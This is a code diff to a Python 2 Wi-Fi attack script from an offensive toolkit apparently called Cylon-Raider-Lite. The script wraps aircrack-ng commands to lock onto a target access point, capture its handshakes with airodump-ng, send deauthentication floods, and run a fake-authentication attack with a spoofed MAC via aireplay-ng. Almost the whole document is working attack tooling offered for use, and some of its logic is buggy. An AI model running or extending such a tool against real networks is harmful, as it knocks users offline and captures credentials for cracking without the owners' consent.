@@ -7,6 +7,7 @@ import operator
 import sys
 import time
 import StringIO
+import threading
 
 cap_file_dir = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/'
 capture_Interface = 'wlan1mon'
@@ -24,17 +25,53 @@ def deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, cap
         )
         os.system(cmd_String)
 
+def BUGGED_fake_auth_threading():
+            # attack_selected = "DIRECT"
+            # read_temp_files() # to retrieve the variables
+            # def thread_1(capture_BSSID, capture_Channel, cap_file, capture_Interface):
+            #     fake_auth_attack(capture_BSSID, capture_Channel, cap_file, capture_Interface)
+            #     return
+            # def thread_2(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface):
+            #     deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
+            #     return
+            #
+            # x = threading.Thread(name='thread_1',target=thread_1)
+            # y = threading.Thread(name='thread_2',target=thread_2)
+            #
+            # x.start()
+            # y.start()
+            #
+            # if KeyboardInterrupt:
+            #     x.terminate()
+            #     y.terminate()
+            # return
+    return
+
 def direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface):
-    user_input = str(raw_input("Press 1 for DIRECT targeting, press 2 for CLIENT targeting for DEAUTH packets: "))
+    user_input = str(raw_input("Press 1 for DIRECT targeting, press 2 for CLIENT targeting for DEAUTH packets, press 3 to FAKE-AUTH: "))
+
+    print """
+    \t\t#0. Return to Main Menu
+    \t\t#1. DIRECTLY target the ACCESS point
+    \t\t#2. CLIENT TARGETING, and listen to handshake transmitted back to AP
+    """
+    #\t\t#3. FAKE-AUTH the AP, to provoke a response
+
     if user_input == "1":
         attack_selected = "DIRECT"
+        deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
     elif user_input == "2":
         attack_selected = "CLIENT"
+        deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
+    elif user_input == "3":
+        return
+        #BUGGED_fake_auth_threading()
+    elif user_input == "0":
+        main()
     else:
         print 'You have entered a invalid option'
         direct_or_client_deauth_question(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
-    deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
-    return attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface
+    return capture_BSSID, capture_Channel, cap_file, capture_Interface
 
 
 
@@ -67,15 +104,33 @@ def save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface
     return a,b,c,d
 
 def start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface):
-    cmd_String = "airodump-ng --bssid {0} -c {1} --write {2} {3}".format(
+    print 'STATUS: Killing off current monitor mode session, to restart it and prevent channel-hop'
+    cmd_String = "airmon-ng stop wlan1mon"
+    os.system(cmd_String)
+    time.sleep(1)
+    print 'DEBUG: %s' % cmd_String
+    cmd_String = "airmon-ng check kill"
+    os.system(cmd_String)
+    time.sleep(1)
+    print 'DEBUG: %s' % cmd_String
+    print 'STATUS: Restarting monitor interface on specific channel: %s' % capture_Channel
+    cmd_String = "airmon-ng start wlan1 %s" % capture_Channel
+    os.system(cmd_String)
+    time.sleep(3)
+    print 'DEBUG: %s' % cmd_String
+
+    cmd_String = "airodump-ng --bssid {0} -a -c {1} --write {2} {3}".format(
         capture_BSSID,
         capture_Channel,
         cap_file,
         capture_Interface
     )
-    print cmd_String
+    print 'STATUS: Restarting airodump-ng'
+    print 'DEBUG: %s' % cmd_String
+    time.sleep(1)
     os.system(cmd_String)
 
+    print 'STATUS: COMPLETE, targeted capture mode running'
     return capture_BSSID, capture_Channel, cap_file, capture_Interface
 
 def gather_target_info():
@@ -85,6 +140,7 @@ def gather_target_info():
     cap_file = cap_file_dir + '_' + timestr + '_' + '.cap'
     save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface)
     return capture_BSSID, capture_Channel, cap_file, capture_Interface
+# cannot mix targeting capture mode and overall capture mode, you must turn off the wifi card and restart it into targeted mode.
 
 def read_temp_files():
     # read temp files
@@ -114,13 +170,25 @@ def read_temp_files():
     )
     direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface) # needs to incorporate the read variables
     return capture_BSSID, capture_Channel, cap_file, capture_Interface
+
+# cannot mix targeting capture mode and overall capture mode, you must turn off the wifi card and restart it into targeted mode.
+
+def fake_auth_attack(capture_BSSID, capture_Channel, cap_file, capture_Interface): # aireplay-ng -a 84:1B:5E:B0:E4:8D -h <set src mac addr> -o 0 -Q --ignore-negative-one --fakeauth 1 wlan1mon
+
+    # start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface)
+    spoof_mac = str(raw_input("What MAC address are we spoofing?: "))
+    cmd_String = "aireplay-ng -1 0 -a %s -h %s --ignore-negative-one wlan0" % (capture_BSSID, spoof_mac)
+    os.system(cmd_String)
+    print 'DEBUG: %s' % cmd_String
+    return capture_BSSID, capture_Channel, cap_file, capture_Interface
+
 def main():
 
     opt_List = [
         '\n\t#0. Return to Main Menu',
         '#1. Select Targeting Capture Mode',
-        '#2. Start the de-auth replay attack'
-    ]
+        '\n### These options below require #1 to be performed FIRST ###\n',
+        '#2. Start the de-auth replay attack'    ]
 
     print ("\n\t".join(opt_List))
     opt_Choice = str(raw_input("Enter a OPTION: "))
@@ -129,5 +197,11 @@ def main():
     elif opt_Choice == "2":
         # direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface)
         read_temp_files()
+    elif opt_Choice == "0":
+        os.system('clear')
+        os.system('Cylon_Raider_Main.py')
+    else:
+        print 'ERROR: You have entered a invalid option'
+        main()
     return
 main()
